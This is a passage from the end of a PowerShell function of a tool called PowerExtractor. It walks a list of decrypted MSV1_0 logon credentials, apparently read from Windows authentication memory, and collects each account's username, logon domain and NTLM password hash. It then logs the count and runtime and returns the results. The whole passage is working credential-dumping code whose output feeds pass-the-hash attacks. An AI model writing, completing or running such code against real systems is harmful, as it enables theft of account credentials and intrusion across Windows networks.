    Foreach($Entry in $CredentialList)
       {
           if($Outcome.username -notcontains $Entry.MSV1_0_CREDENTIAL_LIST.PrimaryCredentials_data.decrypted_data.Username.data)
               {       
               $Outcome += New-Object -Type psobject -Property (@{
                      "Username" = $Entry.MSV1_0_CREDENTIAL_LIST.PrimaryCredentials_data.decrypted_data.Username.data
                      "LogonDomain" =  $Entry.MSV1_0_CREDENTIAL_LIST.PrimaryCredentials_data.decrypted_data.LogonDomainName.data
                      "NTHash" = $Entry.MSV1_0_CREDENTIAL_LIST.PrimaryCredentials_data.decrypted_data.NtOwfPassword
                      })
               }
       }
    Write-Debug -Message ("Results extracted. In summery " + $Outcome.count + " Entries could be identfied")

    
    $End = Get-Date
    
    $Runtime = $End - $start
    Write-Debug -Message ("PowerExtractor completed - Runtime: " + $Runtime.Hours.ToString().PadLeft(2,'0') + ":" + $Runtime.Minutes.ToString().PadLeft(2,'0') + ":" + $Runtime.Seconds.ToString().PadLeft(2,'0') )

    return $Outcome

}
